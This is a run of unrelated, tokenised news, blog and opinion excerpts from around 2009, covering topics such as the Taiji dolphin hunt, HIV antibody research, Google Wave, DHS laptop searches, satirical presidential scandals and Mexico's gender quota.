“ We are not the only nation that kills dolphins , ” he said , pointing out that Canada , the Faeroe Islands and Denmark also hunt several species of dolphin .
“ Why not report about that ? ”
Yet some Taiji residents are conflicted .
Advertisement
“ I know people think we are all barbarians , ” Councilman Hisato Ryono said .
“ There has to be another way to kill these creatures without making them suffer .
But I do n’t know what it is . ”
Concerned about dangerous levels of mercury in the animals , Ryono helped persuade the town to pull dolphin meat from school lunches .
Officials are also conducting tests among residents for mercury levels .
Ryono , who supports the dolphin hunt , said he first had doubts about the practice on a kayak trip when he paddled alongside the highly intelligent mammals and felt what he called a sense of peace and healing .
That night , at a barbecue where dolphin meat was being served , he asked whether anyone else felt strange eating such a wonderful animal .
None did .

He said dolphin fishermen worry that “ The Cove ” might cause enough gaiatsu , or outside pressure , to force them to stop .
But 48 - year - old fisherman Matsumoto , chain - smoking during a two - hour interview , said no amount of gaiatsu would end the practice .
He believes filmmakers enhanced the documentary to make the cove seem bloodier .
He also said that the fishermen changed their killing technique five years ago and believes the makers of “ The Cove ” used footage of old kills to mislead viewers .
“ Killing in groups , we often missed our marks right behind the dolphin ’s head , ” Matsumoto said .
“ They died more slowly .
There was too much blood .
It did n’t look good , and the meat did n’t taste as good . ”
Now dolphins are separated and killed individually .
Like a matador , he said , he can hit his mark “ 99.9 % " of the time .
“ I know the spot , ” he said .
Advertisement
“ I can make a kill in 10 seconds . ”
He defended Taiji and his neighbors .
“ This is not an evil town .
Nice people live here , ” he said .
“ But we are not going to stop this practice .
We are who we are . ”

Santa Cruz DUI , Drugs , Theft , Violent Crimes
An experienced criminal defense lawyer can guide you through the criminal justice system and minimize the penalties you may face .
The extent of this will vary from case to case and is a fact - driven issue because there is no " one size fits all " defense for criminal cases .
With Santa Cruz Defense Attorney John W. Thornton on your side , a defense strategy will be tailor - made for your circumstances .
Criminal courts can become extremely complex to navigate and , depending on the type of charges you face , there may be other administrative bodies you must confront .
In the case of a DUI arrest , for instance , there is a criminal component and a DMV administrative process .
The interaction of the DMV case and the criminal case can become complicated .
A local attorney with 30 plus years of experience knows how to handle these separate processes to avoid potential pitfalls .
Additionally , when you call John W. Thornton , your case will be handled directly by Mr. Thornton who has handled more than 2,500 DUI cases in the Santa Cruz area .
Some of the details he will consider when creating your defense :
Twitter for Sh-tters
Just because we ’re on Twitter does n’t mean we like it .
I can sum up my hatred for this social networking tool in a lot less than 140 characters .
But occasionally people who use Twitter can surprise you and not be narcissistic assholes .
Take Twitter for Sh-tters , which is using the site to raise money for building toilets in India .
India , in case you did n’t know , comprises a large chunk ( 660 million ) of the 2.6 billion people in this world who are still without proper waste removal services .
Therefore , every $ 400 raised through Twitter means a new eco-sanitation toilet for Indians .
“ Apart from the money raised , the bigger purpose of Twitter for Sh-tters ( T4S ) is to make people , especially the youth , talk about sanitation , ” said David Crosweller , UK director of Wherever The Need , the NGO that is building the toilets .
Is n’t that what we ’re doing here ?
I mean , come on – give NTG a little credit for spreading the gospel .
All ego -crushing aside , the facts are really startling .
“ According to the 2001 Census , only 18 % of Indians use toilets .
About 78.4 % of the rural and 13.6 % of the urban population still practices open defecation . ”
To me , $ 400 per toilet seems a little steep .
I ’m not sure if an “ eco- sanitation ” toilet is the best option for people who need this to stave off disease and illness .
Our lust for green design sometimes gets in the way of our sense of utility .
Worrying about our carbon footprint should come after people have a sanitary area to drop a deuce .
However , Wherever the Need claims that the toilets are “ very cheap and simple to build and operate . ”
They also provide opportunities to collect fertilizer and compost to reuse .
To get involved with Twitter for Sh-tters , you sign up to be a T4S “ Daily Dumper ” .
By signing up , “ you pledge to spend a day tweeting about shit ( literally , or not , up to you ) to raise money for Wherever the Need . ”

MALIBU , Calif . - A Wells Fargo & Co. executive who oversees foreclosed properties hosted parties and spent long summer weekends in a $ 12 million Malibu beach house , moving into the home just after it had been surrendered to Wells Fargo to satisfy debts , neighbors said .
The previous owners of the beachfront home in Malibu Colony - a densely built stretch of luxury homes that has been a favorite of celebrities over the years - were financially devastated in Bernard Madoff 's massive fraud scheme , real estate agent Irene Dazzan - Palmer said .
The couple signed the property over to Wells Fargo last spring , and the bank subsequently denied requests to show the house to prospective buyers , Dazzan - Palmer said .
Residents in the gated community told the Los Angeles Times that a woman they believe was Cheronda Guyton took up occupancy at the home in May .
Residents said they obtained Guyton 's name from the community 's guards , who had issued her a homeowner 's parking pass .
Residents also wrote down the license plate number of a 2007 Volvo sport - utility vehicle they say was parked in the home 's garage .
A check of state motor vehicle license plates by the Times found the vehicle was registered to Guyton .
Guyton is a Wells Fargo senior vice president responsible for foreclosed commercial properties , resident Phillip Roman said .
" It 's outrageous to take over a property like that , not make it available and then put someone from the bank in it , " said Roman , who lives a few homes away from the property .
Residents said Guyton , along with her husband and two children , often hosted guests at the home , including a large party the last weekend of August .
Malibu Colony is about 25 miles from downtown Los Angeles .
Wells Fargo said in a written statement that it would conduct a thorough investigation of the allegations by neighbors , but said it would n't " discuss specific team member situations / issues for privacy reasons . "
Guyton 's home number is unlisted , and attempts to reach her at her Los Angeles office after work hours were unsuccessful .
The bank 's agreement with the prior owner required it to keep the home - a 3,800 - square - foot , two - story structure built in the early 1990s - off the market for a period of time , Wells Fargo said in the statement .
The bank said it planned to list the property for sale soon .
Atrack - A Tracker for Google ’s App Engine
Atrack is a ntrack / Bittorrent tracker designed from the ground up to run on Google ’s App Engine grid .
Its main goals are :
As small codebase as possible .
As fast as possible .
As low bandwidth usage as possible .
As low memory usage as possible .
For this it relies heavily ( and almost completely ) on memcached , no data is stored anywhere , and it lets memcached do most of the lifecycle management .
Atrack also aims to respect your privacy : other than what is needed for the most basic tracking ( hashes / keys and ip / ports ) atrack gathers no information whatsoever .
Beyond that no aggregate statistics are kept of anything ( at least once the testing / debugging phase is over ) , and nothing is stored permanently anywhere , not even hashes and ip / ports , they are kept in memory until they are expired by memcached and never written to disk or any other kind of permanent storage .
TODO
Implement the BT compact tracker data format as per BEP 0023 .
Take advantage of Python instance caching as a further cache layer on top of memcached .
Fully specify and implement the complete ntrack protocol .
Implement “ scrap convention ” , but will have to make sure it introduces no performance or privacy issues .
Write a test suite .
IP v6 support .
Future :
Support some kind of private tracking ?
Perhaps IP ACL based ?

The discovery of antibodies that bind to a hitherto unknown “ weak spot ” on HIV has revived hopes that a potent vaccine is within reach .
Now that the weak spot – common to many strains – has been discovered , researchers can aim for vaccines that trick people into making their own antibodies to target it .
“ It ’s the discovery of the target that ’s the key thing , ” says Wayne Koff , senior vice president of research and development at the International AIDS Vaccine Initiative in New York , and a key member of the team reporting the breakthrough .
Vaccine developers have been beset by one failure after another .
One explanation for the failures is that HIV rapidly mutates to escape detection by the immune system .
As a result , many of the mutated strains are no longer recognised by antibodies .

But lab tests show the new antibodies bind to many more strains and variants of HIV than usual , potentially giving patients protection against any strains that infect them , or any new mutants that evolve in their own bodies .
Binding site
Led by Dennis Burton of the Scripps Research Institute in La Jolla , California , the team screened blood from 1800 infected individuals for antibodies .
They found that about 10 per cent of the donors made so - called “ broadly - neutralising antibodies ” ( bNAbs ) that recognise multiple strains of HIV .
Eventually the researchers whittled these down to two extremely potent antibodies – both from the same African donor – that massively outperformed the others .
One , codenamed PG9 , neutralised 127 of 162 HIV strains and the other , codenamed PG16 , neutralised 119 .
More importantly , detailed lab analyses revealed exactly which part of the virus the antibodies recognised , and it turned out to be a region hitherto unrecognised as a binding site .
Linked units
It was a region on gp120 , the protein that forms “ spikes ” on the surface of the virus , and which enables the virus to bind to and infect a cell .
Even more important , the binding site was on a variant of gp120 that consists of three linked units of gp120 – a so - called trimer .
This variant is the way gp120 appears on the virus itself and on infected cells – and therefore the way it will appear to someone ’s immune system .
By contrast , most previous searches for potent antibodies have focused on whether they attach to a single unit of gp120 , called a monomer .
In lab tests , neither of the new antibodies bound to the monomer , demonstrating that their potency would have been missed if they ’d been subjected to this standard screening test .
Common element
Now , thanks to the antibodies , researchers have realised that the trimer is a viral weak spot because it ’s indispensable to the virus .
So unlike many other targets on the virus , it ’s shared by many , if not all , strains of HIV .
“ The key is the trimer , ” says Koff .
“ Our hypothesis now is that if you bind to the trimer , you neutralise the virus , as that ’s how it appears on the surface of the virus . ”
The antibodies are only a starting point , however , and the race is on now to develop synthetic vaccines that have the same shape as the “ weak spot ” , or epitope , so people receiving vaccinations make antibodies that recognise it when the real virus comes along .
More weak spots
“ The identity of this epitope is a major advance and will lead many groups to explore ways to produce new vaccines , ” says Dan Barouch of the Beth Israel Deaconess Medical Center in Boston , Massachusetts , and leader of a recent study exploring why one of the leading vaccine candidates was a failure .
“ It shows exactly the site on HIV that broadly neutralising antibodies can target . ”
Koff says follow - up studies are now under way at IAVI ’s Neutralizing Antibody Center at Scripps – due to open officially on 24 September – to screen for more broadly neutralising antibodies , hopefully revealing yet more sites on the viral anatomy that are indispensable .
“ The expectation is that we ’ll find more , ” he says .
“ We hope there will be a number of sites that are vulnerable , and we ’ll know that in a few months ’ time . ”
It is impossible to predict when the first vaccines targeting “ weak spots ” might go into trials .
But Koff says : “ We ’re cautiously optimistic we ’re now turning in the right direction . ”

Sometimes the best way to get people fired up about a cause — be it environmental , political , or anything else — is to get them angry .
But instead of trying to piss citizens off , a Brazilian environmental group is trying to get the country 's residents to , well , urinate in the shower .
The group says that if a single household flushed the toilet just one fewer times a day , it would save a whopping 1,157 gallons of water each year .
The organization has even come out with a video touting the idea .
Urine is sterile , so peeing in the shower is harmless ( except if someone has a disease that can be transmitted through their pee , such as hepatitis ) .
The AP reports :
The spot features cartoon drawings of people from all walks of life - a trapeze artist , a basketball player , even an alien - urinating in the shower .
Narrated by children 's voices , the ad ends with : " Pee in the shower !
Save the Atlantic rainforest ! "

Google is inviting 100,000 testers to preview its hippie - on - stilts communications platform - Wave - from today .
Mountain View has extended its testing pool in preparation for pushing Wave out to many more users at some point soon .
For now , though , Google is n’t revealing when the platform will be pumped out to the mainstream .
Instead it ’s simply repeating the fact that Wave “ is n’t quite ready for prime time ” .
The company unveiled its new - age web platform at its I / O developer love - in back in May this year .
Wave crossbreeds email with IM and document sharing , and exhibits a particular talent for near real - time interaction .
In order to plump up usage of the platform , Google has already declared its intentions to open source Wave 's underlying protocol as well as a big heap of its client and server code .
Following the project ’s launch , Google pointed out in a blog post yesterday that wrinkles still needed to be ironed out of Wave before the platform is made available to everyone .
Google ’s engineering manager Lars Rasmussen and group product manager Stephanie Hannon said its developers had been working on scalability , stability , speed and usability over the past few months .
“ Yet , you will still experience the occasional downtime , a crash every now and then , part of the system being a bit sluggish and some of the user interface being , well , quirky , ” they said .
Meanwhile ,
Wave is still missing a few key features such as draft mode , user permissions configuration and group definitions .
All pretty integral stuff , you might agree , for a platform that is n’t dressed in orange and chanting with drums and cymbals quite yet .
Rasmussen and Hannon noted that all of those features are expected to be added to Wave over the next few months , but again was unable to be any more specific with its roadmap .
Separately , Hannon wrote on a blog post for developers that Google was mulling ways of making money from a wave extension store , presumably in the mould of Apple 's Apps store .
" To help foster a strong developer ecosystem , we 're exploring plans for a monetisable wave extension store , " she said . ®
The video sparked student protests on campus
The case against four white former students in South Africa who allegedly forced black campus employees to eat urine - soaked food has been postponed .
A video of the incident surfaced in 2008 and they are accused of wilfully harming the employees ' dignity through the use of racial gestures .
The footage caused a national outcry at the time and anti-racism protests .
The postponement until October has been allowed so lawyers for the accused can try for an out - of - court settlement .
Bloemfontein District Court spokesperson Medupi Simasiku told the BBC that the court to allow the lawyers to make submission to the Director of Public Prosecution ( DPP ) to reconsider prosecuting the former students .
He said if the DPP grants their request the matter would be settled outside court .
" The university and the workers would have to find an alternative resolution to the situation , " he said .
But if the trial begins on 26 October and the former University of Free State students are found guilty they face either a fine or a suspended sentence , Mr Simasiku explained .
Anger Mr Simasiku said three of the four ex-students were in court and all five of the complainants .
In the video the campus employees - four women and a man - were allegedly forced to down full bottles of beer and perform athletic tasks
But it is the final extract of the film that most angered members of the public .
It shows a white male urinating on food , and then shouting " Take !
Take ! " in Afrikaans - apparently forcing the campus employees to eat the dirty food , and causing them to vomit .
The video is believed to have been recorded in 2007 in protest against the university 's plans to integrate black and white students in the same residences the following year .
Lawyers for two of the students down played the incident last year saying the video was " no more than play - acting " .
Correspondents say the University of Free State , which has predominantly white students , has encountered difficulties trying to integrate people from other racial groups .
At the time the footage emerged , the institution 's rector , Professor Frederick Fourie , expressed shock at the video and strongly condemned it .
Black students and workers at the university staged protests calling for the students ' expulsion .
Last year , the South African Institute of Race Relations expressed concern that the incident could threaten general improvements in race relations since the end of apartheid in 1994 .

But for some reason he was not in a wheel chair and was able to speak when he made numerous appearances on FOX NEWS ( " Your Money w / Neil Cavuto " " The O" Reilly Factor " ) on 8.7.09 .
He claims he was punched in the face numerous times and kicked in the head , however his face looks fine . [...]
This guy is nothing but a pure fraud , being used by the tea baggers .
Why was this fool able to speak on FOX NEWS but unable to speak from his wheel chair today ?
Now , a day later , he 's confined to a wheelchair and apparently is unable to speak , although he was perfectly articulate in the video above : Via the YouTube blurb : Next , a few excerpts from Windy City Watch about the incident and presser in St. Louis .

I was n't there , but from the videos , it certainly looks as though Gladney was in better shape than he claims to be once he realized he could sue .
And speaking of " hate crimes " , how would he characterize the Tea Terrorists ' intentions when they bring guns to town hall meetings and use words like " Hitler " and " Nazi "
We all know about the big scandals -- Teapot Dome ; Whitewater ; Watergate ; Billy Bathgate -- but we often forget that no presidency , even the super great ones , was untouched by the icy hand of corruption or the warm , moist hand of luridity and depravativity .
We now look back on the first twenty - two presidents and their history of underhanded wheedlings and deedlings :
George Washington
A notorious dandy , Washington wore a new set of translucent wax pants with an extremely low melting point to an outdoor dinner on a hot summer evening .
As the night grew hotter , the ladies in attendance were scandalized when they noticed that Washington forgot to wear a wig .
John Adams
After predecessor George Washington successfully negotiated a secret treaty to buy Quebec from the British , Adams hastily sold the territory to the Algonquin tribe for three magic beans ( though a scandal at the time , Adams was vindicated by history : those beans grew up to be Martin Van Buren , Millard Fillmore and Franklin Pierce ) .
Thomas Jefferson
Two years into his second term , inquisitive journalists brought to light that Jefferson was actually a disguised runaway slave named James " Big Jim " Bovis .
James Madison
When the British set fire to the White House during the War of 1812 , Madison ran into the conflagration to save his prized possession , a comical etching of a pig eating a beet .
His six children burnt to death .
James Monroe
A mere six weeks into his term , it was revealed that James Monroe was actually the very same runaway slave , James " Big James " Bovis , who successfully won the presidency as Thomas Jefferson some years earlier .
John Quincy Adams
In an off - the - cuff statement during a press interview , Adams gestured to his groin and referred to the United States Congress as " Dongress . "
Andrew Jackson
A media scandal erupted when the press revealed that Jackson 's wife , Rachel Jackson , was a divorcee .
A further scandal erupted two years later when the press revealed that his wife was also a saguaro cactus .
Martin Van Buren
Van Buren was mercilessly lampooned by the press when eagle - eyed pundits noticed that he had , in his youth , appeared as an uncredited extra in the Cinemax erotic anthology series " Passion Cove . "
William Henry Harrison
As the nation mourned the loss of its newly - elected leader , Harrison reemerged and sheepishly admitted that he'd faked his own death in order to avoid paying a four - dollar tab at a local bar .
John Tyler
Tyler was thrown out of the Whig party when , during their annual convention in Philadelphia , a gust of wind revealed that he had real hair .
James K. Polk
A nationwide movement of skeptics insisted that Polk 's birth certificate was a forgery , and that he was actually a Turkish - born non-citizen named Klop K. Semaj .
Though their case was never proven , they irritated Polk out of running for a second term .
Zachary Taylor
In the first presidential sex scandal on record , Taylor 's famous nickname , " Old Rough and Ready , " was revealed by the press to mean exactly what it sounds like it means .
Millard Fillmore
Fillmore faced heavy controversy after admitting California to the union in 1850 , thereby granting citizenship to Orange County rock outfit Sugar Ray .
Franklin Pierce
Revered as a war hero for his role in the Mexican - American War , a scandal erupted when recovered records from the era proved that Pierce fought on the side of Mexico .
James Buchanan
After he toppled off the stage during a speech in Pennsylvania , it became clear that Buchanan was actually two children , one standing on the shoulders of the other , draped in an adult - sized overcoat .
Abraham Lincoln
Lincoln 's legendary honesty got the better of him when he told Vice President Hannibal Hamlin that he looked like an elderly potato - bird that had been left out in the sun to wither .
Hamlin never recovered , and renounced the vice presidency a short while later .
In the same year , Lincoln 's administration was scandalized to the point of near collapse when an editorial cartoon in a Philadelphia newspaper depicted him as " Abraham Stincoln . "
Andrew Johnson
Johnson ’s rivals attributed a conflict of interest to the embattled president when it was revealed that he was a major shareholder in a company hired by his own administration to refurnish the White House , and also that he was the king of Spain .
Ulysses S. Grant
Though embattled by several scandals , perhaps the most damaging was the accusation by some critics of the time that his Modernist stream - of - consciousness narration was overly cryptic and impenetrable .
Rutherford B. Hayes
Though Hayes was by no means the first president to teach obscenities to Flutus , the longstanding presidential parrot , the unmatched vulgarity of Hayes ’ contributions to the bird ’s lexicon outraged the public , many of whom had been specifically named in the parrot ’s blue tirades .
James A. Garfield
Though Garfield endured few controversies during his short tenure as president , the greatest of his scandals is collected in the posthumous volume James A. Garfield : The Compleat Erotic Verse .
Chester A. Arthur
Though his presidency was largely unmarred by scandal , some historians now believe that he was actually James “ Big Jim ” Bovis , a runaway slave in disguise .
Grover Cleveland
While Cleveland is famous for being the only president to serve two non-consecutive terms , his method of achieving this feat -- turning all the calendars at the White House back eight years -- caused significant controversy at the time .

Human Action is the legacy of a genius , left to us and to be passed on from generation to generation .
Most books , like their authors , are soon forgotten .
Human Action lives , and its influence will live throughout the centuries .
It is one of those books to which we return again and again — it never fails us , never ceases to instruct .
In the world of economic literature , Human Action now holds the position which Adam Smith ’s Wealth of Nations used to occupy .
Smith had derived his economic knowledge from universal propositions which he deemed clearly established .
He proceeded from the assumption that nature has endowed man with a motivating power that prompts him to better his condition .
And he accepted the axiom that the individual aiming only at his properly understood interests tended to promote the public good .
Government and other institutions that interfere with the smooth operation of the natural order are bound to defeat their own end .
Yet , the economics of Adam Smith encompassed only a small phase of the whole range of human action , only “ economic action . ”
Economics dealt with individual action as it was affected by the profit motive and economic selfishness .
From Adam Smith to John Maynard Keynes , economics was a philosophy of the “ economic side of man . ”
Professor Mises widened the scientific horizon and greatly enlarged the field of economics .
On the foundation of classical economics and the teaching of his Austrian predecessors he presented a general theory of choice and preference in all human action , a more universal science which he called “ praxeology . ”
Praxeology is a theoretical science which either deduces the ends from the application of certain means or , inversely , the means from the attainment of chosen ends .
It shows man how he must act in order to attain definite ends .
Praxeology thus derives substantive truths about man and his work .
It is the science of every kind of human action .
It applies to all ends and all means , both material and ideal , the sublime and the base , the noble and ignoble .
Man arranges them in a single row , and subjects them to his preferences , to his individual scale of gradation and choice .
Catallactic chores ( i.e. , exchanges ) are embedded in this arrangement .
No treating of economic problems proper can avoid starting from acts of choice ; economics is merely a part , although the best developed part of the more universal science , praxeology .
Unfortunately , most economists still are blind to the general theory of human action .
Like the Medieval philosophers and Mercantilistic economists before them , they continue to search either for the ultimate destiny of mankind or for the perfect society as they envision it .
They do not search for the principle of praxeology which corrects old creeds , sweeps away erroneous notions , and discloses universal laws .
NEW DELHI  Indian authorities have detained a North Korean vessel and are searching it for radioactive material , the first time a ship has been seized and boarded under sanctions adopted by the United Nations Security Council in June .
The cargo ship , M V San , was spotted Friday , officials said , and detained under the authority of the United Nations resolution passed after North Korea tested a nuclear device in May .
The ship anchored without authorization in the Andaman and Nicobar Islands , a territory of India in the Bay of Bengal , last week , according to the Indian military .
Indian officials said it was carrying more than 16,000 tons of sugar bound for the Middle East .
But the ship ’s proximity to Myanmar , a North Korean ally , and the fact that it had no apparent reason to be in the area raised suspicions .
Effect Animation with Pyglet
Last Update : 20.09.2009 .
By azarai in game development | pyglet | python
While browsing through deviantart i run across some nice prerendered particle effects .
The effects are made for RPG Maker VX and cover mostly some kind of magic spells .
Game use is allowed .
So we got effect animations , pyglet and some spare time .
Let the fun begin .
The effects do have a black background instead of transparency , so one has to do some post proccessing before further use .
I did this with Gimp and used a grayscale version of an effect image as its alpha mask .
Now lets start the fun part and use some of these effects in pyglet .
The most important task is reading and processing the effects animation from the image .
Its done in the create_effect_animation function .
Basically i use an ImageGrid and bring the AnimationFrames in the correct order and give back an pyglet Animation object .
The rest of the demo is just control stuff …
Controls :
w : switch background to white
b : switch background to black
1 - 5 : change particle effect

I guess this is my first finished turning that came out okay .
It ’s a chunk of Eucalyptus , from the same euc I previously turned into a pen holder cup here ( at the bottom ) .
That seemed like a finished piece , too , but it was more an experiment I kept going with until it suddenly seemed like a finished piece , whatever that means .
I turned this between centers to cylindrical , then in the chuck with first some tailstock support while I made the cup down to the stem , stem not included , then removed the tailstock to do the interior of the cup , then went back and did the stem and base .
Finish is 3 coats of Minwax water - based wipe - on - poly ( that stuff is waaay more runny than I thought , poured it right past the rag and all over my hand ) , followed by Hut PPP satin , then gloss polishing wax compound .
This one has been an inspiration to keep honing my skills .
It ’s a decent finished piece , but I can objectively see that it does n’t really have that sharpness of a professional turning , and I ’m not entirely sure why yet .
I think this is where it gets into details , and tightening up the lines and curves – always a difficult thing for me .
I ’m very technical , and tend to see things in right angles :)

Although the US has extensive legal protections for personal property and information , these only apply once you 're actually inside the country .
As part of its role in protecting the nation 's borders , the US government has extensive leeway to search personal possessions with little in the way of what might be considered just cause .
As personal possessions have gone digital , the Department of Homeland Security has targeted the devices and their data , and courts have ruled that agents have the right to seize laptops and examine the data on them .
The ability to arbitrarily seize personal electronic devices , from laptops to iPods , has concerned everyone from the Electronic Frontier Foundation to a business travelers trade group , and prompted the introduction of a bill in Congress that would call on the DHS to clarify its rules .
On Thursday , the DHS did precisely that , providing a set of standards for the handling of personal electronics and data .
The new rules are unlikely to end the controversy , however , as they continue to leave major decisions up to the discretion of DHS employees .
The primary document starts out by recognizing that although Customs and Immigration authorities have had the ability to hold personal property for years , the public is justified in thinking that seizures of electronics are a distinct issue .
" Where someone may not feel that the inspection of a briefcase would raise significant privacy concerns because the volume of information to be searched is not great , " the report notes , " that same person may feel that a search of their laptop increases the possibility of privacy risks due to the vast amount of information potentially available on electronic devices . "
So , DHS gets it : our laptops allow us to carry our lives around with us , and losing them is not only a tremendous inconvenience , but raises legitimate fears of exposing irrelevant personal information .
Just because they get it , however , does n't mean that they 're going to act upon that knowledge in any significant manner .
The new policy statement sets a few standards and limits for what they do with hardware and data , but does n't really change the dynamics of the seizures .
So , for example , the document states that the owner of a device should be present when its contents are examined , but carves out so many vague exceptions — " unless there are national security , law enforcement , or other operational considerations that make it inappropriate to permit the individual to remain present " — that it 's not clear that the principle would have any practical impact .
In the same manner , it lays out the principle that the hardware should be returned to its owner as soon as possible , but only " when appropriate , given the facts and circumstances of the matter . "
And that 's after the agent has been given the opportunity to copy all of the device 's data .
Different authorities under the DHS umbrella also get different standards to adhere to .
So , for example , Customs and Border Protection ( CBP ) agents are supposed to get approval from a supervisor to keep a device for more than five days , and from a director - level authority to keep it past 15 .
In contrast , Immigrations and Customs Enforcement ( ICE ) officers do n't have to do anything for up to 30 days .
Data obtained by CBP officers can only be sent to other government agencies for decryption or translation , while ICE gets to use third - party contractors .
So , what happens to your hardware and data depends entirely on who seizes it .
And the standards for seizure remain very low .
Anyone on a terrorist watch list is fair game , for example .
It 's not all bad news .
The document points to existing policies which cover especially sensitive data related to business , legal actions , medical records , and the source materials of journalists , and says that the seizures must comply with these .
But , in general , the policy simply codifies some aspects of the program while leaving immense discretionary power in the hands of DHS agents .
Although it 's nice to know precisely what guidelines these agents are expected to operate within , it will be small comfort for anyone who returns home only to have their laptop seized indefinitely .

The hellish - hot weather persuaded me that I was wise to ignore the caution expressed by a close friend who grew up in Dallas , as I set off to give talks there .
Better wear a bulletproof vest , he told me .
I was , nonetheless , feeling a bit anxious , given what had happened during my last major speech there , when I addressed the World Affairs Council of Greater Dallas on Jan. 20 , 2004 .
Then my topic was " Intelligence and War : Lessons From the Recent Past , " and I was very intentional about being , well , fair and balanced in devoting equal time to listing the baleful lies of two Texans - Lyndon Baines Johnson and George W. Bush - both of whom got a lot of people killed in unnecessary war .
I even reached back into history to enlist help from a former president whom Bush had called his favorite - Teddy Roosevelt , who said :
" To announce that there is to be no criticism of the president or that we are to stand by the president right or wrong is not only unpatriotic and servile , but morally treasonable to the American people . "
Suffice it to say that my attempt at evenhandedness failed miserably , even though I used up a lot of precious time rehearsing LBJ 's perfidy on Vietnam - dissecting , in particular , his exploitation of dubious intelligence regarding the Gulf of Tonkin non-incident of Aug.
4 , 1964 .
I gave pride of place to that well deserved castigation before I delved into a reconstruction of what was already discernible as of January 2004 with respect to the lies told by George W. Bush to " justify " attacking Iraq exactly 10 months before .
Okay , so maybe I laid it on a little thick in citing what Nazi war criminal Hermann Goering told his American interrogator in Nuremberg :
" Naturally , the common people do not want war .
That is understood .
But after all it is the leaders of a country who determine the policy and it is always a simple matter to drag the people along , whether it is a democracy or a fascist dictatorship or a Parliament or a communist dictatorship ....
" The people can always be brought to do the bidding of the leaders .
That is easy .
All you have to do is tell them they are being attacked and denounce the pacifists for lack of patriotism and exposing the country to danger .
It works the same way in any country . "

" Déjale el lugar a tu hermano que va a cenar " , decía con frecuencia mi abuela a la misma hija que media hora antes había apresurado a tener " lista y calientita la merienda " en espera del hermano , que al igual que ella , regresaba del trabajo .
El asiento al que mi tía obligadamente renunciaba ( y mi tío con toda naturalidad tomaba ) era el que estaba frente al televisor .
¿ Por qué dejar el asiento ? , se preguntará tal vez alguna mujer nacida en los noventas : porque era " el hombre " ... y eran mediados de los años 70 .
Entonces , frases como " el lugar de las mujeres está su casa " , " calladitas son más bonitas " o " el último que llegue es vieja " se decían sin pudor ni reparo y casi sin réplica .
¿ Se imaginan lo que tendría que sortear entonces una mujer para dedicarse a la política y lograr ser la elegida para ocupar un cargo de representación popular ?
Tiempos pasados ... estamos en vísperas del bicentenario del inicio de la Guerra de la independencia , finales de la primera década del nuevo siglo .
Los tiempos ciertamente no son los mismos .
¿ Verdad ?
De ahí que haya surgido una ola de indignación en la sociedad civil mexicana estos días luego de que en la primera sesión ordinaria de la nueva legislatura , el pasado 3 de septiembre , ocho mujeres solicitaran permiso para dejar su lugar a sus suplentes , hombres , en la Cámara de Diputados .
Si se considera además que se trata de ¡escaños reservados para la cuota de género !
nadie con un mínimo de decencia puede negar que este es un acto abiertamente discriminatorio y de real menosprecio hacia la ciudadanía de las mujeres , por parte de la mayoría de los grupos parlamentarios de la LXI Legislatura : las diputadas son dos del PRI , de los izquierdistas PRD y PT , una en cada caso , y cuatro del llamado Partido Verde Ecologista de México .
Inscrito " como un simple trámite " en el primer punto de la Orden del Día , el intento de hacer pasar esta penosa maniobra sin sobresaltos y de espaldas a los electores se desplomó ante los cuestionamientos vertidos por diputadas de diversas expresiones políticas que rechazamos tan indignante despojo a la ya de por sí precaria presencia femenina en este espacio parlamentario .
La voz plural del reclamo obligó a los partidos políticos responsables de esta acción a retirar de la sesión el punto , buscaban evitar ser evidenciados ante la opinión pública como cómplices de un asunto contrario al espíritu de la ley .
Si bien el punto se regresó a la Junta de Coordinación Política para su análisis , es muy probable que de manera silenciosa se eche mano del truco que la misma ley contiene : pasados sesenta días de inasistencia del titular se debe llamar al suplente para que tome su lugar .
Ante ello jurídicamente no se puede hacer nada para evitar este golpe a la cuota de género en la Cámara .
Lamentablemente sabemos que estos ocho no serán los únicos lugares arrebatados a las mujeres para entregarlos soterradamente a " cómodos señores " que sin ganarlo en las urnas ( sea porque de ser candidatos hubieran perdido o porque representan intereses que pretendieron ocultar ) simplemente planearon llegar a las curules " haciéndole truco a la ley " , usurpando además lugares destinados legalmente a mujeres .
Así , ante la norma electoral que dispone como acción afirmativa el estímulo de una mayor presencia de las ciudadanas , los partidos políticos responden recurriendo a estratagemas canallas como la de colocar a mujeres sin preparación o conciencia política en el penoso papel de simuladoras , obligándolas a burlar la ley para dañar los derechos que tanto trabajo han costado establecer en favor de la igualdad .
Lamentablemente el espectro de los partidos políticos no ha sabido hacer honor al notable esfuerzo que las políticas hacen por abrirse espacios en la vida social y partidista .
El colmo del cinismo es el caso del Partido Verde Ecologista de México que ha convertido esta nefasta medida en su " uso y costumbre " .
El líder cameral de ese organismo confiesa que " ni es la primera y seguramente no será la última " ocasión en que esto ocurra .
De acuerdo con el último Informe de Desarrollo Humano del Programa de las Naciones Unidas para el Desarrollo , México ocupaba con datos de la anterior Legislatura , en los indicadores de participación política de la mujer , un porcentaje de escaños parlamentarios ocupados por mujeres en la cámara baja o única de 22.6 y en la cámara alta o senado de sólo 17.2 que , sin ubicarlo en los extremos que se dan entre democracias como la de Suecia ( 47.3 por ciento del total ) y la nula voz de mujeres parlamentarias que aún subsiste en muchos países , lo mantiene en una brecha que corre el riesgo de crecer y que sobre todo no refleja la composición poblacional del país ¿y cómo no si después de sortear una infinidad de obstáculos misóginos antes y durante sus campañas para alcanzar apenas cerca de la cuarta parte de la representación popular , las mexicanas todavía ven mermada su presencia para vigilar y legislar a favor de sus derechos más elementales con este tipo de trampas ?
Mal comienzo para una legislatura a la que le esperan retos importantes para llegar a los acuerdos básicos para una gobernabilidad democrática , lo que sólo se conseguirá si ante ella se coloca una opinión pública activamente participativa que le conduzca , entre otras cosas , a asegurar que en todas las comisiones , comités y grupos que se conformen exista una presencia clara de legisladoras .
Para que los partidos políticos hagan bien sus cuentas de género y no quieran venir a llamarse a sorpresa , hay que recordarles que , por ejemplo , el Artículo 7 de la Convención sobre la Eliminación de Todas las Formas de Discriminación contra la Mujer expresa que : Los Estados Partes tomarán todas las medidas apropiadas para eliminar la discriminación contra la mujer en la vida política y pública del país y , en particular , garantizando en igualdad de condiciones con los hombres el derecho a votar en todas las elecciones y referéndums públicos y ser elegibles para todos los organismos cuyos miembros sean objeto de elecciones públicas , para lo cual además existen recomendaciones muy específicas y otra serie de tratados internacionales que amparan estos derechos políticos de las mujeres y sobre los cuales se deben entregar informes .
El retroceso que intenta dar esta , la LXI legislatura , tendrá que quedar inscrito en tales informes como otra serie de regresiones legislativas que el país ha permitido , entre otras cosas , con objeto de evitar que las mujeres decidan sobre su propio cuerpo .
